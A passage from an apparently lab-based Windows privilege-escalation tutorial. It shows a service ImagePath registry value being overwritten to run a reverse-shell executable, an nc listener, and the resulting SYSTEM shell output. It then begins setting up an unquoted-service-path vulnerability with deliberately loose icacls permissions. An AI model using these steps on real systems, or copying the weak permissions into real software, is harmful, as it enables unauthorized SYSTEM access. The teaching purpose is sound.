</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="n">DISPLAY_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">ACCOUNT</span><span class="err">:</span> <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl">        <span class="n">SECURITY</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl">                <span class="n">Interrogate</span>
</span></span><span class="line"><span class="cl">                <span class="n">Enumerate</span> <span class="n">Dependents</span>
</span></span><span class="line"><span class="cl">                <span class="n">Pause</span><span class="p">/</span><span class="n">Resume</span>
</span></span><span class="line"><span class="cl">                <span class="nb">Start
</span></span></span><span class="line"><span class="cl"><span class="nb"></span>                <span class="n">Stop</span>
</span></span><span class="line"><span class="cl">                <span class="nb">User-Defined</span> <span class="n">Control</span>
</span></span><span class="line"><span class="cl">                <span class="n">Read</span> <span class="n">Permissions</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">                <span class="n">All</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">Everyone</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl">                <span class="n">Interrogate</span>
</span></span><span class="line"><span class="cl">                <span class="n">Enumerate</span> <span class="n">Dependents</span>
</span></span><span class="line"><span class="cl">                <span class="nb">Start
</span></span></span><span class="line"><span class="cl"><span class="nb"></span>                <span class="n">Stop</span>
</span></span><span class="line"><span class="cl">                <span class="n">Read</span> <span class="n">Permissions</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check the current values in the registry entry:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKLM\System\CurrentControlSet\Services\Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Type </span>   <span class="n">REG_DWORD</span>    <span class="n">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Start </span>   <span class="n">REG_DWORD</span>    <span class="n">0x3</span>
</span></span><span class="line"><span class="cl">    <span class="n">ErrorControl</span>    <span class="n">REG_DWORD</span>    <span class="n">0x1</span>
</span></span><span class="line"><span class="cl">    <span class="n">ImagePath</span>    <span class="n">REG_EXPAND_SZ</span>    <span class="s2">&#34;C:\Program Files\Insecure Registry Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DisplayName</span>    <span class="n">REG_SZ</span>    <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">    <span class="n">ObjectName</span>    <span class="n">REG_SZ</span>    <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span><span class="p">\</span><span class="n">Security</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: We&rsquo;re gonna change the <strong>ImagePath</strong> registry key and as we can see from the <strong>ObjectName</strong> registry key, this service runs as LocalSystem <code>NT AUTHORITY\SYSTEM</code>.</p>
</blockquote>
<p>Overwrite the <strong>ImagePath</strong> registry key to point to the <code>reverse.exe</code> executable we created:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\services\Insecure Registry VulnService&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">f</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then in the attacker host, we&rsquo;ll set up a <code>nc</code> listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">443</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">stop</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">is</span> <span class="n">stopping</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">Insecure</span> <span class="n">Registry</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">was</span> <span class="n">stopped</span> <span class="n">successfully</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">net</span> <span class="nb">start </span><span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have escalated privileges to <code>NT AUTHORITY\SYSTEM</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="mf">443</span>
</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="no">any</span><span class="p">]</span> <span class="mf">443</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">27</span><span class="p">.</span><span class="mf">128</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">27</span><span class="p">.</span><span class="mf">129</span><span class="p">]</span> <span class="mf">50954</span>
</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="no">Version 10.0.22000.493</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">USER</span> <span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">----------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Name</span>           <span class="n">SID</span>
</span></span><span class="line"><span class="cl"><span class="p">===================</span> <span class="p">========</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">18</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Group </span><span class="n">Name</span>                             <span class="nb">Type </span>            <span class="n">SID</span>          <span class="n">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="p">======================================</span> <span class="p">================</span> <span class="p">============</span> <span class="p">==================================================</span>
</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                 <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">group</span><span class="p">,</span> <span class="nb">Group </span><span class="n">owner</span>
</span></span><span class="line"><span class="cl"><span class="n">Everyone</span>                               <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">0</span>      <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>       <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">System</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">16384</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Privilege</span> <span class="n">Name</span>                            <span class="n">Description</span>                                                        <span class="n">State</span>
</span></span><span class="line"><span class="cl"><span class="p">=========================================</span> <span class="p">==================================================================</span> <span class="p">========</span>
</span></span><span class="line"><span class="cl"><span class="n">SeAssignPrimaryTokenPrivilege</span>             <span class="n">Replace</span> <span class="n">a</span> <span class="k">process</span> <span class="n">level</span> <span class="n">token</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeLockMemoryPrivilege</span>                     <span class="n">Lock</span> <span class="n">pages</span> <span class="k">in</span> <span class="n">memory</span>                                               <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseQuotaPrivilege</span>                  <span class="n">Adjust</span> <span class="n">memory</span> <span class="n">quotas</span> <span class="k">for</span> <span class="n">a</span> <span class="k">process</span>                                 <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTcbPrivilege</span>                            <span class="n">Act</span> <span class="n">as</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">operating</span> <span class="n">system</span>                                <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSecurityPrivilege</span>                       <span class="n">Manage</span> <span class="n">auditing</span> <span class="n">and</span> <span class="n">security</span> <span class="n">log</span>                                   <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTakeOwnershipPrivilege</span>                  <span class="n">Take</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">or</span> <span class="n">other</span> <span class="n">objects</span>                           <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeLoadDriverPrivilege</span>                     <span class="n">Load</span> <span class="n">and</span> <span class="n">unload</span> <span class="n">device</span> <span class="n">drivers</span>                                     <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemProfilePrivilege</span>                  <span class="n">Profile</span> <span class="n">system</span> <span class="n">performance</span>                                         <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemtimePrivilege</span>                     <span class="n">Change</span> <span class="n">the</span> <span class="n">system</span> <span class="n">time</span>                                             <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeProfileSingleProcessPrivilege</span>           <span class="n">Profile</span> <span class="n">single</span> <span class="k">process</span>                                             <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseBasePriorityPrivilege</span>           <span class="n">Increase</span> <span class="n">scheduling</span> <span class="n">priority</span>                                       <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreatePagefilePrivilege</span>                 <span class="n">Create</span> <span class="n">a</span> <span class="n">pagefile</span>                                                  <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreatePermanentPrivilege</span>                <span class="n">Create</span> <span class="n">permanent</span> <span class="n">shared</span> <span class="n">objects</span>                                    <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeBackupPrivilege</span>                         <span class="n">Back</span> <span class="n">up</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeRestorePrivilege</span>                        <span class="n">Restore</span> <span class="n">files</span> <span class="n">and</span> <span class="n">directories</span>                                      <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeShutdownPrivilege</span>                       <span class="n">Shut</span> <span class="n">down</span> <span class="n">the</span> <span class="n">system</span>                                               <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeDebugPrivilege</span>                          <span class="n">Debug</span> <span class="n">programs</span>                                                     <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeAuditPrivilege</span>                          <span class="n">Generate</span> <span class="n">security</span> <span class="n">audits</span>                                           <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeSystemEnvironmentPrivilege</span>              <span class="n">Modify</span> <span class="n">firmware</span> <span class="n">environment</span> <span class="n">values</span>                                 <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeChangeNotifyPrivilege</span>                   <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                                           <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeUndockPrivilege</span>                         <span class="n">Remove</span> <span class="n">computer</span> <span class="n">from</span> <span class="n">docking</span> <span class="n">station</span>                               <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeManageVolumePrivilege</span>                   <span class="n">Perform</span> <span class="n">volume</span> <span class="n">maintenance</span> <span class="n">tasks</span>                                   <span class="n">Disabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeImpersonatePrivilege</span>                    <span class="n">Impersonate</span> <span class="n">a</span> <span class="n">client</span> <span class="n">after</span> <span class="n">authentication</span>                          <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreateGlobalPrivilege</span>                   <span class="n">Create</span> <span class="n">global</span> <span class="n">objects</span>                                              <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeIncreaseWorkingSetPrivilege</span>             <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span>                                    <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeTimeZonePrivilege</span>                       <span class="n">Change</span> <span class="n">the</span> <span class="n">time</span> <span class="n">zone</span>                                               <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeCreateSymbolicLinkPrivilege</span>             <span class="n">Create</span> <span class="n">symbolic</span> <span class="n">links</span>                                              <span class="n">Enabled</span>
</span></span><span class="line"><span class="cl"><span class="n">SeDelegateSessionUserImpersonatePrivilege</span> <span class="n">Obtain</span> <span class="n">an</span> <span class="n">impersonation</span> <span class="n">token</span> <span class="k">for</span> <span class="n">another</span> <span class="n">user</span> <span class="k">in</span> <span class="n">the</span> <span class="n">same</span> <span class="n">session</span> <span class="n">Enabled</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna delete this service from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">delete</span> <span class="s2">&#34;Insecure Registry VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">DeleteService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="defense-2">Defense</h2>
<p>Make sure that the service registry hives Security permissions that restrict a user from editing it.</p>
<h1 id="privilege-escalation-via-unquoted-service-path">Privilege Escalation via Unquoted Service Path</h1>
<p>The Windows system executables can be executed without their extension, e.g., &ldquo;notepad.exe&rdquo; can be run by typing &ldquo;notepad&rdquo;. Additionally, some executables take arguments separated by spaces, e.g., &ldquo;program.exe arg_1 arg_2&rdquo;.</p>
<p>Here is an example path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span><span class="p">\</span><span class="n">Service</span><span class="p">.</span><span class="py">exe</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This path isn&rsquo;t enclosed with quotes (<code>&quot; &quot;</code>) which means that in reality, the Windows system interprets this path as:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span>      <span class="s2">&#34;Files\Vuln&#34;</span> <span class="s2">&#34;Service\Service.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span><span class="p">.</span><span class="py">exe</span>  <span class="s2">&#34;Argument 1&#34;</span> <span class="s2">&#34;Argument 2&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The Windows system clarifies the situation by examining each of the options listed above. The problem lies in whether we can write to a directory that Windows checks before the actual executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span> <span class="c"># Writable</span>
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Service</span><span class="p">.</span><span class="py">exe</span>   <span class="c"># Malicious Executable (Created by the attacker)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In summary, this is vulnerable when the path <strong>doesn&rsquo;t have quotes and it has spaces</strong>.</p>
<h2 id="configuration-3">Configuration</h2>
<p>Open an <strong>administrator</strong> command prompt or a PowerShell console as <strong>administrator</strong> and create the directory that we will use for the service path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">md </span><span class="s2">&#34;C:\Program Files\Unquoted Path Service&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Copy the service executable file to the path of the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">copy </span><span class="s2">&#34;C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe&#34;</span> <span class="s2">&#34;C:\Program Files\Unquoted Path Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">dir </span><span class="s2">&#34;C:\Program Files\Unquoted Path Service\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">560A</span><span class="p">-</span><span class="n">9A69</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="n">Directory</span> <span class="n">of</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">03</span><span class="p">/</span><span class="mf">09</span><span class="p">/</span><span class="mf">2022</span>  <span class="mf">12</span><span class="err">:</span><span class="mf">06</span> <span class="n">AM</span>             <span class="mf">7</span><span class="p">,</span><span class="mf">168</span> <span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">               <span class="mf">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>          <span class="mf">7</span><span class="p">,</span><span class="mf">168</span> <span class="n">bytes</span>
</span></span><span class="line"><span class="cl">               <span class="mf">0</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mf">55</span><span class="p">,</span><span class="mf">280</span><span class="p">,</span><span class="mf">295</span><span class="p">,</span><span class="mf">936</span> <span class="n">bytes</span> <span class="n">free</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Grant full permissions to the executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Unquoted Path Service&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;Authenticated Users:F&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Unquoted</span> <span class="n">Path</span> <span class="n">Service</span>
</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create the service with an <strong>unquoted path</strong> with the SCM:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
